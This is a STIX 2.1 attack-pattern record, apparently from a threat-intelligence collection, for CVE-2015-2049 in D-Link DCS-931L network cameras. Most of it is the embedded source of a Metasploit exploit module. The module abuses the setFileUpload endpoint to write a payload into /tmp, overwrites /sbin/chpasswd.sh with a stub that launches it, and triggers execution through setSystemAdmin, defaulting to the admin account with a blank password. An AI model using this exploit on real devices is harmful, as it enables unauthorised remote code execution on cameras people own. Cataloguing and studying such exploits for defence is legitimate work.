{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4aa43e5a-804f-4fe2-b1be-a644e3e207ec",
    "created": "2024-08-14T17:03:26.642206Z",
    "modified": "2024-08-14T17:03:26.64221Z",
    "name": "D-Link DCS-931L File Upload",
    "description": " This module exploits a file upload vulnerability in D-Link DCS-931L network cameras. The setFileUpload functionality allows authenticated users to upload files to anywhere on the file system, allowing system files to be overwritten, resulting in execution of arbitrary commands. This module has been tested successfully on a D-Link DCS-931L with firmware versions 1.01_B7 (2013-04-19) and 1.04_B1 (2014-04-21). D-Link DCS-930L, DCS-932L, DCS-933L models are also reportedly affected, but untested.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dcs931l_upload.rb",
            "external_id": "dlink_dcs931l_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2049"
        },
        {
            "source_name": "reference",
            "url": "https://tangiblesecurity.com/index.php/announcements/tangible-security-researchers-notified-and-assisted-d-link-with-fixing-critical-device-vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10049#Vendoradvisory"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  HttpFingerprint = { :pattern => [ /alphapd/ ] }\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'D-Link DCS-931L File Upload',\n      'Description' => %q{\n          This module exploits a file upload vulnerability in D-Link DCS-931L\n        network cameras. The setFileUpload functionality allows authenticated\n        users to upload files to anywhere on the file system, allowing system\n        files to be overwritten, resulting in execution of arbitrary commands.\n        This module has been tested successfully on a D-Link DCS-931L with\n        firmware versions 1.01_B7 (2013-04-19) and 1.04_B1 (2014-04-21).\n        D-Link DCS-930L, DCS-932L, DCS-933L models are also reportedly\n        affected, but untested.\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Mike Baucom', 'Allen Harper', 'J. Rach', # Initial discovery by Tangible Security\n          'bcoles' # Metasploit\n        ],\n      'Payload' =>\n        {\n          'Space' => 1024, # File upload\n          'DisableNops' => true\n        },\n      'Platform' => 'linux',\n      'Privileged' => false,\n      'Targets' =>\n        [\n          [ 'Linux mipsle Payload',\n            {\n              'Arch' => ARCH_MIPSLE,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'References' =>\n        [\n          [ 'CVE', '2015-2049' ],\n          [ 'URL', 'https://tangiblesecurity.com/index.php/announcements/tangible-security-researchers-notified-and-assisted-d-link-with-fixing-critical-device-vulnerabilities' ],\n          [ 'URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10049' ] # Vendor advisory\n        ],\n      'DisclosureDate' => '2015-02-23'))\n\n    register_options(\n      [\n        OptString.new('HttpUsername',  [true, 'Camera username', 'admin']),\n        OptString.new('HttpPassword',  [false, 'Camera password (default: blank)', ''])\n      ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri('uploadfile.htm'),\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n    )\n\n    unless res\n      vprint_status(\"The connection timed out.\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.code && res.code == 404\n      vprint_status(\"uploadfile.htm does not exist\")\n      return Exploit::CheckCode::Safe\n    elsif res.code && res.code == 401 && res.headers['WWW-Authenticate'] =~ /realm=\"DCS\\-931L\"/\n      vprint_error(\"Authentication failed\")\n      return Exploit::CheckCode::Detected\n    elsif res.code && res.code == 200 && res.body && res.body =~ /Upload File/\n      return Exploit::CheckCode::Vulnerable\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    payload_path = \"/tmp/.#{rand_text_alphanumeric(rand(8) + 5)}\"\n\n    # upload payload\n    res = upload(payload_path, generate_payload_exe)\n\n    unless res\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    if res.code && res.code == 404\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed or setFileUpload functionality does not exist\")\n    elsif res.code && res.code == 200 && res.body && res.body =~ /File had been uploaded/\n      print_good(\"Payload uploaded successfully\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to upload payload\")\n    end\n    register_file_for_cleanup(payload_path)\n\n    # overwrite /sbin/chpasswd.sh with stub\n    res = upload('/sbin/chpasswd.sh', \"#!/bin/sh\\n#{payload_path}&\\n\")\n\n    unless res\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    if res.code && res.code == 404\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed or setFileUpload functionality does not exist\")\n    elsif res.code && res.code == 200 && res.body && res.body =~ /File had been uploaded/\n      print_good(\"Stager uploaded successfully\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to upload stager\")\n    end\n\n    # execute payload using stub\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri('setSystemAdmin'),\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'vars_post' => Hash[{\n        'ReplySuccessPage' => 'advanced.htm',\n        'ReplyErrorPage' => 'errradv.htm',\n        'ConfigSystemAdmin' => 'Apply'\n      }.to_a.shuffle])\n\n    unless res\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    if res.code && res.code == 401\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    elsif res.code && res.code == 200 && res.body\n      print_good(\"Payload executed successfully\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Payload execution failed\")\n    end\n  end\n\n  #\n  # Replace chpasswd.sh with original contents\n  #\n  def cleanup\n    chpasswd = <<-EOF\n#!/bin/sh\n#\n# $Id: chpasswd.sh, v1.00 2009-11-05 andy\n#\n# usage: chpasswd.sh <user name> [<password>]\n#\n\nif [ \"$1\" == \"\" ]; then\n    echo \"chpasswd: no user name\"\n    exit 1\nfi\n\necho \"$1:$2\" > /tmp/tmpchpw\nchpasswd < /tmp/tmpchpw\nrm -f /tmp/tmpchpw\nEOF\n    res = upload('/sbin/chpasswd.sh', chpasswd)\n    if res && res.code && res.code == 200 && res.body && res.body =~ /File had been uploaded/\n      vprint_good(\"Restored /sbin/chpasswd.sh successfully\")\n    else\n      vprint_warning(\"Could not restore /sbin/chpasswd.sh to default\")\n    end\n  end\n\n  #\n  # Upload a file to a specified path\n  #\n  def upload(path, data)\n    vprint_status(\"Writing #{data.length} bytes to #{path}\")\n\n    boundary = \"----WebKitFormBoundary#{rand_text_alphanumeric(rand(10) + 5)}\"\n    post_data  = \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"ReplySuccessPage\\\"\\r\\n\"\n    post_data << \"\\r\\nreplyuf.htm\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"ReplyErrorPage\\\"\\r\\n\"\n    post_data << \"\\r\\nreplyuf.htm\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"Filename\\\"\\r\\n\"\n    post_data << \"\\r\\n#{path}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"UploadFile\\\"; filename=\\\"#{rand_text_alphanumeric(rand(8) + 5)}\\\"\\r\\n\"\n    post_data << \"Content-Type: application/octet-stream\\r\\n\"\n    post_data << \"\\r\\n#{data}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"ConfigUploadFile\\\"\\r\\n\"\n    post_data << \"\\r\\nUpload File\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri('setFileUpload'),\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'ctype' => \"multipart/form-data; boundary=#{boundary}\",\n      'data' => post_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-23",
    "x_mitre_platforms": [
        "linux"
    ]
}